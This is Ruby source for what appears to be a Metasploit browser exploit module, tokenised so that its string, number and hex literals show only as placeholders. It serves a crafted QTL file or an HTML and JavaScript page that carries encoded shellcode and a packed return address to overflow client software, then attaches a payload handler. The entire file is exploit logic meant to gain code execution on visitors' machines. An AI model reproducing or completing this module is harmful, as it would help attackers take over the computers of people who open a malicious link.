require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) end def on_request_uri ( client , request ) return if ( ( p = regenerate_payload ( client ) ) == nil ) if ( target . name =~ <str> ) if ( request [ <str> ] =~ <str> ) target = targets [ <int> ] else target = targets [ <int> ] end end cruft = rand_text_alphanumeric ( <int> ) sploit = rand_text_english ( <int> ) sploit << p . encoded + <str> + rand_text_english ( <int> ) sploit << [ target . ret ] . pack ( <str> ) + [ <hex> , - <int> ] . pack ( <str> ) if ( request [ <str> ] =~ <str> or request . uri =~ <str> ) print_status ( <str> target . name <str> ) content = build_qtl ( sploit ) else print_status ( <str> ) shellcode = Rex :: Text . to_unescape ( p . encoded ) url = ( ( datastore [ <str> ] ) ? <str> : <str> ) url << ( ( datastore [ <str> ] == <str> ) ? Rex :: Socket . source_address ( client . peerhost ) : datastore [ <str> ] ) url << <str> + datastore [ <str> ] . to_s url << get_resource js = <<- <str> ENDJS <str> <str> ENDJS content = <str> js <str> content << <<- <str> ENDEMBED <str> <str> ENDEMBED content << <str> end send_response ( client , content , { <str> = > <str> } ) handler ( client ) end def build_qtl ( overflow ) cruft = rand_text_english ( <int> ) content = <str> content << <str> content << <str> content << <str> cruft <str> content << <str> cruft <str> content << <str> content << <str> cruft <str> overflow <str> end end 
